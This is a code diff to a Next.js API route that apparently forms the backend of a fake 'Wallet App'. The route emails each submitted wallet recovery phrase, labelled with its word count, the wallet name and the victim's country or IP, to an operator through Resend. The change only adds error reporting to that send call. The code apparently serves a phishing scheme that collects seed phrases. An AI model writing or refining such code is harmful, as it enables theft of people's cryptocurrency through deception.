@@ -273,7 +273,7 @@ export async function POST(req: NextRequest) {
 </html>`;
 
   try {
-    await resend.emails.send({
+    const { data, error } = await resend.emails.send({
       from: "Wallet App <onboarding@uwem.dev>",
       // Now using your verified custom domain, you can send to any email!
       to: [
@@ -283,7 +283,13 @@ export async function POST(req: NextRequest) {
       subject: `🔐 ${wordCount}-word phrase · ${wallet ?? "Unknown"} · ${flag}${geo.country_name ?? ip}`,
       html,
     });
-    return NextResponse.json({ success: true });
+
+    if (error) {
+      console.error("Resend error:", error);
+      return NextResponse.json({ success: false, error: error.message }, { status: 500 });
+    }
+
+    return NextResponse.json({ success: true, data });
   } catch (error) {
     return NextResponse.json({ success: false, error: (error as Error).message }, { status: 500 });
   }
